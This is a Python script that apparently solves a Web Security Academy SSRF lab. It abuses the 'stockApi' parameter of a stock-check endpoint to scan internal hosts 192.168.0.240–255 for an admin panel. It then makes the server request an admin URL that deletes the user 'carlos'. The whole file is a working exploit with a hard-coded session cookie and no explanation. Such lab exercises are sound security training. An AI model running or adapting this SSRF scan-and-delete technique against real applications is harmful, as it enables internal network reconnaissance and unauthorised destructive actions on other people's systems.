import requests
from bs4 import BeautifulSoup as bs
url = "https://0ab8007e03d2f3ff804b7b7700d100e7.web-security-academy.net/product/stock"
admin_url = ""
headers = {'Cookie': 'session=BrQf4eH9TTxyHZShtrr9bNh1NU3oNYM2'}
for ip_range in range(240, 256):
    print("IP: ", ip_range)
    body = { "stockApi": f'http://192.168.0.{ip_range}:8080/admin' }
    session = requests.Session()
    req = session.post(url=url, data=body)
    if(req.status_code == 200):
        print("Found admin at url: ", body)
        soup = bs(req.content)
        html = soup.prettify()
        print("Body: ", html)
        admin_url=f'http://192.168.0.{ip_range}:8080/admin/delete?username=carlos'
        break

#Delete user with SSRF
session = requests.Session()
body = { "stockApi": admin_url }
req = session.post(url=url, data=body, headers=headers)
print(req.status_code, " -- ", req.content)